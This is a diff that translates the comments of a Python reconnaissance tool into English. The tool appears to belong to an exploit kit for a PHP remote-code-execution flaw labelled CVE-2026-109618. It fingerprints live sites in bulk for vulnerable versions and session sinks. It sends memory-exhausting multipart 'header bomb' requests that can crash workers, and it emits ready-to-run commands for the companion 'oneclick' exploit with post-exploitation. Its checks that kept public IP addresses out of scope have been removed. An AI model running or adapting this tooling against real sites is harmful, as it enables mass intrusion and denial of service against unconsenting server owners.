@@ -1,27 +1,27 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""recon —— CVE-2026-109618 真实站点侦察（默认只读，深度落点探测需显式 --deep）
+"""recon -- CVE-2026-109618 live-site reconnaissance (read-only by default; deep landing-point probing needs an explicit --deep)
 
-为什么需要它
-------------
-真实生产站点通常剥离 X-Powered-By、隐藏 phpinfo、把 404 改成自定义页，
-仅靠 `fingerprint`（响应体 PHP/x.y.z + X-Powered-By）会一律落到 rc=10
-「LIKELY_RCE 但无证据」。本模块用多条**只读**通道取证，并把
-「能不能打」拆成四个可分别验证的前置：
+Why it is needed
+----------------
+Real production sites usually strip X-Powered-By, hide phpinfo, and replace 404 pages with custom ones,
+so `fingerprint` alone (body PHP/x.y.z + X-Powered-By) always lands on rc=10
+"LIKELY_RCE but no evidence". This module gathers evidence over several **read-only** channels and splits
+"can it be exploited" into four independently verifiable preconditions:
 
-  1) 版本/影响区间    —— 多通道版本取证（header/body/credits/404 签名/cookie）
-  2) 消费点           —— 是否有入口调用 session_start()（PHPSESSID 下发）
-  3) 落点             —— post_max_size 与 memory_limit 的相对关系（--deep 实测）
-  4) 偏移             —— 版本/build 是否有可用的 profile，否则需 calibrate
+  1) version/affected range  -- multi-channel version evidence (header/body/credits/404 signature/cookie)
+  2) sink                    -- whether any entry calls session_start() (PHPSESSID issued)
+  3) landing point           -- relative relation of post_max_size and memory_limit (measured with --deep)
+  4) offset                  -- whether a usable profile exists for the version/build, otherwise calibrate
 
-输出一个 verdict 分级 + 可直接复制的 next-step 命令。
+It outputs a verdict classification + next-step commands that can be copied directly.
 
-安全定位
---------
-- 默认不发送任何超大 body；`--deep` 才会做递增体积的 OOM 落点探测（有节流与预算上限，
-  对生产站点仍可能造成 worker 重启/短暂 5xx，属于**需要授权**的主动测试）。
-- 不再做地址范围校验：公网 IP 可直接作为目标，授权责任由使用者承担。
-- 与 oneclick 的分工：recon 只判定可行性，oneclick 才开火。
+Security positioning
+--------------------
+- By default no oversized body is sent; only `--deep` performs OOM landing-point probing with increasing sizes (throttled and budget-capped,
+  which may still cause worker restarts/brief 5xx on production sites and is an active test **requiring authorization**).
+- No more address-range checks: public IPs can be used as targets directly, and authorization responsibility rests with the user.
+- Division of labor with oneclick: recon only judges feasibility, oneclick does the firing.
 """
 import argparse
 import json
@@ -39,11 +39,11 @@ import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 
-# 受影响区间（官方修复版本）: 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12
+# Affected range (official fixed versions): 8.2<8.2.35 / 8.3<8.3.36 / 8.4<8.4.27 / 8.5<8.5.12
 AFFECTED_RANGES = ((8, 2, 35), (8, 3, 36), (8, 4, 27), (8, 5, 12))
 
-# 实测无法完成 RCE 的 build（在区间内但缺 infoleak/偏移不可用）：如实降级，避免假阳性
-KNOWN_NO_RCE = {"8.2.12": "8.2.x 无 Stage-1 infoleak 通道，OOM 后拿不到堆基址（实测 6 轮全败，仅 DoS）"}
+# Builds measured to be unable to complete RCE (in range but lacking infoleak/usable offset): downgrade honestly to avoid false positives
+KNOWN_NO_RCE = {"8.2.12": "8.2.x has no Stage-1 infoleak channel, so the heap base cannot be obtained after OOM (all 6 measured rounds failed, only DoS)"}
 
 COMMON_ENTRIES = [
     "/", "/index.php", "/index.html", "/login.php", "/admin/", "/admin.php",
@@ -51,12 +51,12 @@ COMMON_ENTRIES = [
     "/wp-login.php", "/administrator/", "/phpinfo.php", "/info.php",
 ]
 
-# 快速模式：只查首页与 index.php，用于上千目标的批量初筛
+# Fast mode: query only the home page and index.php, for bulk first-pass screening of thousands of targets
 FAST_ENTRIES = ["/", "/index.php"]
 
 PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/php.php", "/test.php", "/i.php"]
 
-# PHP 特殊 ?= 查询串（php_logo / credits / phpinfo 触发器）
+# PHP special ?= query strings (php_logo / credits / phpinfo triggers)
 MAGIC_QUERIES = {
     "php_logo": "?=PHPE9568F36-D428-11d2-A769-00AA001ACF42",
     "php_credits": "?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
@@ -84,7 +84,7 @@ def _ssl_ctx(insecure, host=""):
 
 
 def _hdrs(obj):
-    """把重复头合并为 "a, b"（urllib 的 dict 化会丢掉前面的 Set-Cookie）。"""
+    """Merge repeated headers into "a, b" (urllib's dict conversion drops earlier Set-Cookie values)."""
     acc = {}
     try:
         items = obj.getheaders() if hasattr(obj, "getheaders") else (obj.items() if obj else [])
@@ -97,7 +97,7 @@ def _hdrs(obj):
 
 
 def is_public_host(host):
-    """保留供外部脚本引用；recon 自身不再据此拦截目标。"""
+    """Kept for external scripts to reference; recon itself no longer blocks targets based on it."""
     if not host:
         return True
     h = host.strip("[]").split(":")[0]
@@ -178,7 +178,7 @@ class Client(object):
                     "ms": int((time.time() - t0) * 1000)}
 
 
-# ---------------------------------------------------------------- 版本取证
+# ---------------------------------------------------------------- version evidence
 def _ver_from_text(s):
     if not s:
         return None
@@ -208,7 +208,7 @@ def classify_version(v):
 
 
 def probe_version(c, log, fast=False):
-    """返回 (candidates:list of (version, channel, evidence), channels:list of dict)"""
+    """Return (candidates:list of (version, channel, evidence), channels:list of dict)"""
     cands = []
     chans = []
 
@@ -217,7 +217,7 @@ def probe_version(c, log, fast=False):
         if ver:
             cands.append((ver, channel, ev))
 
-    # 1) 首页 + index.php 的 headers / body（快速模式只打首页，1 个请求）
+    # 1) headers / body of the home page + index.php (fast mode hits only the home page, 1 request)
     paths = ("/",) if fast else ("/", "/index.php")
     for p in paths:
         r = c.get(p)
@@ -232,16 +232,16 @@ def probe_version(c, log, fast=False):
         add(v2, "header:server@" + p, sv[:120])
         v3 = _ver_from_text(r["body"].decode("utf-8", "replace")[:65536])
         add(v3, "body@" + p, "code=%s len=%d" % (r["code"], len(r["body"])))
-        # 记号：cookie 名 / 错误页指纹
+        # markers: cookie names / error-page fingerprints
         sc = r["headers"].get("set-cookie", "")
         if "PHPSESSID" in sc:
             chans.append({"channel": "cookie@" + p, "version": None,
-                          "evidence": "Set-Cookie: PHPSESSID（session 消费点存在）"})
+                          "evidence": "Set-Cookie: PHPSESSID (session sink present)"})
 
     if fast:
         return cands, chans
 
-    # 2) PHP 特殊查询串：logo/credits 能证明「跑 PHP」，且常带版本
+    # 2) PHP special query strings: logo/credits prove "PHP is running" and often carry a version
     for name, q in MAGIC_QUERIES.items():
         r = c.get("/" + q)
         if r["err"] or r["code"] is None:
@@ -254,7 +254,7 @@ def probe_version(c, log, fast=False):
         ev = "code=%s ct=%s gif=%s len=%d" % (r["code"], ct[:40], is_gif, len(body))
         add(v, name, ev)
 
-    # 3) phpinfo 常见落点
+    # 3) common phpinfo locations
     for p in PHPINFO_PATHS:
         r = c.get(p)
         if r["err"]:
@@ -264,7 +264,7 @@ def probe_version(c, log, fast=False):
             add(v, "phpinfo@" + p, "200 len=%d" % len(r["body"]))
             break
 
-    # 4) 404 签名：区分 PHP-FPM / mod_php / 非 PHP
+    # 4) 404 signature: distinguish PHP-FPM / mod_php / non-PHP
     rnd = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
     r = c.get("/%s_%d.php" % (rnd, random.randint(1000, 9999)))
     b = r["body"].decode("utf-8", "replace")[:4096]
@@ -284,7 +284,7 @@ def probe_version(c, log, fast=False):
 
 
 def best_version(cands):
-    """按通道可信度加权取众数。"""
+    """Pick the mode weighted by channel reliability."""
     weight = {"header:x-powered-by": 5, "body": 3, "phpinfo": 5,
               "php_logo": 2, "php_credits": 2, "header:server": 2}
     score = {}
@@ -296,7 +296,7 @@ def best_version(cands):
     return sorted(score.items(), key=lambda kv: -kv[1])[0][0]
 
 
-# ---------------------------------------------------------------- 消费点
+# ---------------------------------------------------------------- sinks
 def probe_sinks(c, entries, log, fast=False):
     sinks = []
     for p in entries:
@@ -309,7 +309,7 @@ def probe_sinks(c, entries, log, fast=False):
             if fast:
                 break
             continue
-        # 非 PHPSESSID 的会话型 cookie（很多框架自定义 session 名）
+        # session-type cookies other than PHPSESSID (many frameworks use custom session names)
         for part in sc.split(","):
             kv = part.strip().split(";")[0]
             if "=" not in kv:
@@ -320,7 +320,7 @@ def probe_sinks(c, entries, log, fast=False):
             if len(val) >= 16 and re.search(r"\d", val) and re.search(r"[A-Za-z]", val) \
                     and name.lower() not in ("security", "lang", "theme", "timezone"):
                 sinks.append({"entry": p, "cookie": sc[:160], "code": r["code"],
-                              "note": "疑似会话 cookie: " + name})
+                              "note": "possible session cookie: " + name})
                 break
         if fast and sinks:
             break
@@ -328,19 +328,19 @@ def probe_sinks(c, entries, log, fast=False):
     return sinks
 
 
-# ---------------------------------------------------------------- 落点
+# ---------------------------------------------------------------- landing point
 def build_header_bomb(mb, boundary="----p2srecon"):
-    """构造 multipart：单 part 内海量短 header 行（膨胀比最高，实测 ~34x）。"""
+    """Build multipart: massive short header lines inside a single part (highest expansion ratio, ~34x measured)."""
     target = int(mb * 1024 * 1024)
     head = ("--%s\r\nContent-Disposition: form-data; name=\"f\"\r\n" % boundary).encode()
     tail = ("\r\n--%s--\r\n" % boundary).encode()
-    line = b"X-A: 0123456789abcdef0123456789abcdef\r\n"  # 40B/行
+    line = b"X-A: 0123456789abcdef0123456789abcdef\r\n"  # 40B/line
     n = max(1, (target - len(head) - len(tail)) // len(line))
     return head + line * n + tail, "multipart/form-data; boundary=" + boundary
 
 
 def probe_oom(c, sizes, budget, delay, log):
-    """递增 body 体积，识别 OOM/413/连接异常；返回探测记录与判定。"""
+    """Increase the body size step by step, identify OOM/413/connection anomalies; return probe records and verdict."""
     recs = []
     oom_at = None
     pm_hit_at = None
@@ -378,14 +378,14 @@ def probe_oom(c, sizes, budget, delay, log):
     verdict = {
         "oom_at_mb": oom_at,
         "post_max_hit_mb": pm_hit_at,
-        # OOM 在 body S MB 时发生 ⇒ memory_limit < S 的解析开销；post_max 未在 S 之前拦截
+        # OOM occurs when the body is S MB => memory_limit < parsing overhead of S; post_max did not block before S
         "post_max_gt_memory_limit": bool(oom_at and not pm_hit_at),
         "records": recs,
     }
     return recs, verdict
 
 
-# ---------------------------------------------------------------- profile 匹配
+# ---------------------------------------------------------------- profile matching
 def profile_hint(ver):
     db = {}
     try:
@@ -395,43 +395,43 @@ def profile_hint(ver):
     except Exception:
         db = {}
     if not db:
-        return {"match": None, "known": [], "advice": "无法载入内建 profile 表"}
+        return {"match": None, "known": [], "advice": "cannot load the built-in profile table"}
     known = sorted(db.keys())
     if ver and ver in db:
-        return {"match": ver, "known": known, "advice": "直接可打（同 build）"}
+        return {"match": ver, "known": known, "advice": "exploitable as-is (same build)"}
     return {"match": None, "known": known,
-            "advice": "版本未在内建表，需 calibrate：`p2s_ext.py calibrate -u URL --collab`"}
+            "advice": "version not in the built-in table, calibrate required: `p2s_ext.py calibrate -u URL --collab`"}
 
 
 def rce_chain_status(args, ver, vclass, sinks, oom, profile):
-    """把四个前置合成 verdict。"""
+    """Combine the four preconditions into a verdict."""
     php_seen = bool(ver) or bool(sinks)
     if vclass == "patched":
-        return "NOT_AFFECTED", "版本 %s 已修复（>= 修复线）" % ver
+        return "NOT_AFFECTED", "version %s is patched (>= fixed line)" % ver
     if vclass == "too_old":
-        return "NOT_AFFECTED", "版本 %s 早于受影响区间" % ver
+        return "NOT_AFFECTED", "version %s predates the affected range" % ver
     if vclass == "affected":
         if ver in KNOWN_NO_RCE:
-            return "DOS_ONLY", "版本 %s 在区间内但已实测不可 RCE：%s" % (ver, KNOWN_NO_RCE[ver])
+            return "DOS_ONLY", "version %s is in range but measured as not RCE-able: %s" % (ver, KNOWN_NO_RCE[ver])
         if not sinks:
-            return "NO_SESSION_SINK", "版本受影响但未观察到 session 消费点（PHPSESSID 未下发）"
+            return "NO_SESSION_SINK", "version is affected but no session sink was observed (PHPSESSID not issued)"
         if args.deep:
             if oom.get("oom_at_mb") and not oom.get("post_max_hit_mb"):
                 if profile.get("match"):
-                    return "RCE_LIKELY", "四前置齐备：受影响版本 + 消费点 + post_max>memory + 已知 build"
-                return "NEEDS_CALIBRATION", "四前置齐备但 build 未知，先 calibrate 偏移"
+                    return "RCE_LIKELY", "all four preconditions: affected version + sink + post_max>memory + known build"
+                return "NEEDS_CALIBRATION", "all four preconditions but the build is unknown, calibrate the offset first"
             if oom.get("post_max_hit_mb") and not oom.get("oom_at_mb"):
-                return "DOS_ONLY", "body 在 %sMB 被 413 拦截，post_max_size 小于落点" % oom["post_max_hit_mb"]
+                return "DOS_ONLY", "body blocked with 413 at %sMB, post_max_size is below the landing point" % oom["post_max_hit_mb"]
             if not oom.get("oom_at_mb"):
                 mx = max([r["mb"] for r in oom.get("records", [])] or [0]) if oom.get("records") else 0
                 if mx >= 8:
-                    return "DOS_ONLY", ("在 %.0fMB 内未触发 OOM：POST 超 post_max_size 会被 PHP 静默截断"
-                                        "（不返回 413），落点不可达 → 仅 DoS" % mx)
-                return "UNKNOWN_PRECOND", "递增探测未触发 OOM（落点可能高于探测上限，加 --probe-sizes 32,64）"
-        return "NEEDS_PRECOND_PROBE", "版本受影响且有消费点；落点未测，加 --deep 判定"
+                    return "DOS_ONLY", ("no OOM triggered within %.0fMB: POSTs above post_max_size are silently truncated by PHP"
+                                        " (no 413 returned), landing point unreachable -> DoS only" % mx)
+                return "UNKNOWN_PRECOND", "incremental probing did not trigger OOM (landing point may be above the probe ceiling, add --probe-sizes 32,64)"
+        return "NEEDS_PRECOND_PROBE", "version affected and sink present; landing point not measured, add --deep to decide"
     if php_seen:
-        return "UNKNOWN_VERSION", "确认跑 PHP 但版本不可判（-v 加 --deep 或用 phpinfo/错误页人工确认）"
-    return "UNKNOWN", "未取得任何 PHP 证据（可能非 PHP 站点或全站 WAF 拦截）"
+        return "UNKNOWN_VERSION", "confirmed to run PHP but the version cannot be determined (add -v --deep or confirm manually via phpinfo/error page)"
+    return "UNKNOWN", "no PHP evidence obtained (possibly not a PHP site or a site-wide WAF blocking)"
 
 
 def next_steps(base, verdict, profile, args):
@@ -445,34 +445,34 @@ def next_steps(base, verdict, profile, args):
         out.append("%s oneclick -u %s%s --http-read %s%s --rounds 8 --tries 2 --force "
                    "--postex --only id --outdir out" % (" ".join(cmd), base, sec, base, sec))
     elif verdict == "DOS_ONLY":
-        out.append("仅 DoS：`%s fingerprint -u %s%s` 可留证，不建议继续" % (" ".join(cmd), base, sec))
+        out.append("DoS only: `%s fingerprint -u %s%s` keeps evidence; continuing is not recommended" % (" ".join(cmd), base, sec))
     elif verdict in ("NOT_AFFECTED", "NO_SESSION_SINK", "UNKNOWN_VERSION", "UNKNOWN"):
-        out.append("不建议开火；先人工确认版本/入口（%s fingerprint -u %s%s）" % (" ".join(cmd), base, sec))
+        out.append("do not fire; confirm version/entry manually first (%s fingerprint -u %s%s)" % (" ".join(cmd), base, sec))
     return out
 
 
 def main(argv=None):
     ap = argparse.ArgumentParser(
         prog="recon",
-        description="CVE-2026-109618 真实站点侦察：多通道版本取证 + 消费点 + 落点 + 偏移匹配")
-    ap.add_argument("-u", "--url", required=True, help="目标 URL（http/https）")
-    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验（自签靶场）")
+        description="CVE-2026-109618 live-site reconnaissance: multi-channel version evidence + sink + landing point + offset matching")
+    ap.add_argument("-u", "--url", required=True, help="target URL (http/https)")
+    ap.add_argument("--insecure", action="store_true", help="skip TLS certificate verification (self-signed labs)")
     ap.add_argument("--timeout", type=float, default=12.0)
     ap.add_argument("--ua", default=None)
-    ap.add_argument("--entries", default="", help="自定义入口列表（逗号分隔），覆盖默认集")
+    ap.add_argument("--entries", default="", help="custom entry list (comma-separated), overrides the default set")
     ap.add_argument("--deep", action="store_true",
-                    help="开启落点探测（发送递增体积 multipart，可能造成 5xx，需授权）")
+                    help="enable landing-point probing (sends increasing-size multipart, may cause 5xx, requires authorization)")
     ap.add_argument("--fast", action="store_true",
-                    help="快速模式：只查首页版本 + 最多 2 个 sink 入口（2–3 个请求），跳过 magic/phpinfo/404 与 --deep")
+                    help="fast mode: only check home page version + at most 2 sink entries (2–3 requests), skipping magic/phpinfo/404 and --deep")
     ap.add_argument("--probe-sizes", default="0.5,1,2,4,8,16")
-    ap.add_argument("--budget", type=int, default=6, help="深度探测最多请求数")
-    ap.add_argument("--delay", type=float, default=1.0, help="深度探测间隔秒")
-    ap.add_argument("--json", action="store_true", help="输出 JSON")
+    ap.add_argument("--budget", type=int, default=6, help="max number of deep probe requests")
+    ap.add_argument("--delay", type=float, default=1.0, help="delay between deep probes in seconds")
+    ap.add_argument("--json", action="store_true", help="output JSON")
     ap.add_argument("-v", "--verbose", action="store_true")
     a = ap.parse_args(argv)
     a.insecure = a.insecure or _env_insecure()
     if a.fast and a.deep:
-        sys.stderr.write("[*] --fast 已启用：跳过 --deep 落点探测（快速模式只做只读初筛）\n")
+        sys.stderr.write("[*] --fast is enabled: skipping --deep landing-point probing (fast mode is read-only first-pass screening only)\n")
         a.deep = False
 
     base = a.url.rstrip("/")
@@ -480,7 +480,7 @@ def main(argv=None):
     c = Client(base, insecure=a.insecure, timeout=a.timeout, ua=a.ua)
     t0 = time.time()
 
-    # TCP 预检：连不上就立刻判 UNREACHABLE，不再等 3 次 HTTP 超时（批量时差别很大）
+    # TCP precheck: if the connection fails, judge UNREACHABLE immediately instead of waiting for 3 HTTP timeouts (big difference in bulk runs)
     pu = urllib.parse.urlsplit(base)
     phost = pu.hostname or ""
     pport = pu.port or (443 if pu.scheme == "https" else 80)
@@ -497,18 +497,18 @@ def main(argv=None):
             "version_channels": [], "session_sinks": [],
             "deep_probes": [], "precondition": {}, "profile": {},
             "verdict": "UNREACHABLE",
-            "reason": "TCP 连接失败（%s:%s）: %s" % (phost, pport, pre_err),
+            "reason": "TCP connection failed (%s:%s): %s" % (phost, pport, pre_err),
             "next_steps": [], "requests": 0, "bytes": 0, "tcp_ok": False,
             "elapsed_ms": int((time.time() - t0) * 1000),
         }
         if a.json:
             print(json.dumps(report, ensure_ascii=False, indent=2))
         else:
-            print("[!] TCP 预检失败 %s:%s —— %s" % (phost, pport, pre_err))
+            print("[!] TCP precheck failed %s:%s -- %s" % (phost, pport, pre_err))
         return 50
 
     if not a.json:
-        print("[*] recon 目标：%s（fast=%s insecure=%s deep=%s）"
+        print("[*] recon target: %s (fast=%s insecure=%s deep=%s)"
               % (base, a.fast, a.insecure, a.deep))
 
     cands, chans = probe_version(c, print, fast=a.fast)
@@ -517,7 +517,7 @@ def main(argv=None):
 
     entries = ([x.strip() for x in a.entries.split(",") if x.strip()]
                or (FAST_ENTRIES if a.fast else COMMON_ENTRIES))
-    # 版本已确认修复/过旧时不需要再找 sink，快速模式直接省掉 1–2 个请求
+    # when the version is confirmed patched/too old there is no need to look for sinks, fast mode saves 1–2 requests
     if a.fast and vclass in ("patched", "too_old"):
         sinks = []
     else:
@@ -549,35 +549,35 @@ def main(argv=None):
     if a.json:
         print(json.dumps(report, ensure_ascii=False, indent=2))
     else:
-        print("\n== 版本取证 ==")
+        print("\n== version evidence ==")
         for ch in chans:
             print("  [%-22s] %-10s %s" % (ch["channel"], ch["version"] or "-", ch["evidence"]))
-        fixnote = ("，修复线 %d.%d.%d" % fixed) if fixed else ""
-        print("  => 版本 %s（%s%s）" % (ver or "未知", vclass, fixnote))
-        print("\n== session 消费点 ==")
+        fixnote = (", fixed line %d.%d.%d" % fixed) if fixed else ""
+        print("  => version %s (%s%s)" % (ver or "unknown", vclass, fixnote))
+        print("\n== session sinks ==")
         if sinks:
             for s in sinks[:8]:
                 print("  [sink] %-16s code=%s %s" % (s["entry"], s["code"], s.get("cookie", "")[:90]))
         else:
-            print("  未观察到 PHPSESSID/会话 cookie（%d 个入口）" % len(entries))
+            print("  no PHPSESSID/session cookie observed (%d entries)" % len(entries))
         if a.deep:
-            print("\n== 落点探测（--deep）==")
+            print("\n== landing-point probing (--deep) ==")
             for r in oom_recs:
                 print("  %5.2f MB -> code=%s kind=%-18s %s" % (r["mb"], r["code"], r["kind"],
                                                               (r.get("err") or r.get("snippet") or "")[:70]))
-            print("  => OOM@%s MB, post_max 拦截@%s MB, post_max>memory_limit=%s"
+            print("  => OOM@%s MB, post_max block@%s MB, post_max>memory_limit=%s"
                   % (oom.get("oom_at_mb"), oom.get("post_max_hit_mb"),
                      oom.get("post_max_gt_memory_limit")))
         print("\n== profile ==")
         print("  match=%s known=%s" % (profile.get("match"), ",".join(profile.get("known") or [])[:120]))
         print("  %s" % profile.get("advice"))
-        print("\n== 结论：%s ==" % verdict)
+        print("\n== verdict: %s ==" % verdict)
         print("  %s" % reason)
         if steps:
-            print("\n== 下一步 ==")
+            print("\n== next steps ==")
             for s in steps:
                 print("  " + s)
-        print("\n[统计] 请求 %d 次 / 下载 %d B / 耗时 %d ms"
+        print("\n[stats] requests %d / downloaded %d B / elapsed %d ms"
               % (c.sent, c.bytes, report["elapsed_ms"]))
 
     if verdict in ("RCE_LIKELY", "NEEDS_CALIBRATION", "NEEDS_PRECOND_PROBE"):
